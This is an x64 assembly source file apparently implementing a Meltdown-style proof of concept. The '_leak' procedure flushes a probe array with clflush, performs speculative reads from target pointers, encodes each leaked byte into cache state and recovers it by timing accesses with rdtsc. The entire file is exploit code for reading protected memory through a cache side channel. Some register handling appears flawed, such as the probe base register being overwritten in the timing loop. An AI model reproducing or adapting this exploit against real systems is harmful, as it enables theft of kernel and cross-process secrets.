.code
; @ReleasePreview

EXTRN probeArray: QWORD
EXTRN timings:    QWORD

; rcx - ptrtable targets
; rdx - number of entries in ptrtable
;  r8 - mask table to indicate target pointer
; usable volatile: RAX, R9, R10, R11 
_leak PROC PUBLIC
    ; save nonvolatile registers
    push rbx
    push rbp
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15

    ; allocate stackspace including 32byte shadowstack
    mov rbp, rsp
    sub rsp, 20h

	; invalidate L3 cache via clflush
	mov rax, probeArray
	mov r9,  ((1000h * 100h) / 40h) ; 0x100000 byte divided by cacheline size (64byte)
	_cache_invalidate_loop:
		; invalidate cacheline
		clflush [rax]
		add rax, 40h
		dec r9
		jnz _cache_invalidate_loop

    ; r9 endpointer ptrtable
    mov r9,  rdx
    shl r9,  03h
    add r9,  rcx
    mov rsi, rcx ; rsi iterator ptrtable
	mov rdi, probeArray ; probe array iterator timing loop
	mov r12, ((1000h * 100h) / 40h / 40h) ; r12 is probe array counter timing loop
	mov r13, timings ; timings table iterator
	mov rbx, probeArray ; probe array base speculative execution
    xor rax, rax ; clear rax
    ; r8 mask table iterator
    _read_loop:
        cmp rsi, r9
        jz _read_loop_end

		clflush	 [rbx + rax]

        mov r11, qword ptr [rsi] ; r11 holds pointer to potential target
        xor rax, rax ; clear rax

        mov r10, qword ptr [r8]  ; r10 holds mask table entry
        test r10, r10 ; check if we should execute the read (r10 != 0) or skip (r10 == 0)
        jz   _skip_read
        
		_read:
        mov al,  byte ptr [r11] ; speculative invalid access
        shl rax, 0ch
        jz _read
        mov r11, qword ptr [rbx + rax] ; access cacheline in probeArray

        ; increment and continue
        add rsi, 8h
        add r8 , 8h
        jmp _read_loop

		_skip_read:
        ; measure access times to first cacheline of each of the 256 4096byte sized memory chunks
        ; rdi probeArray iterator
        _read_timing_loop:
        mfence
        lfence
        rdtsc
        lfence
        mov r10, rax
        mov rbx, qword ptr [rdi] ; read from cacheline in probearray
        lfence
        rdtsc
        mov r11, rax
        sub r11, r10 ; r11 holds access time

        ; store timing in timings table (r13)
        mov qword ptr [r13], r11
        add r13, 08h

        add rdi, (40h * 40h) ; increment rdi by 0x40 cachelines
        dec r12
        jnz _read_timing_loop
        
    _read_loop_end:

    ; restore nonvolatile registers and tear down stackframe
    add rsp, 20h

    pop r15
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx
    ret
_leak ENDP

END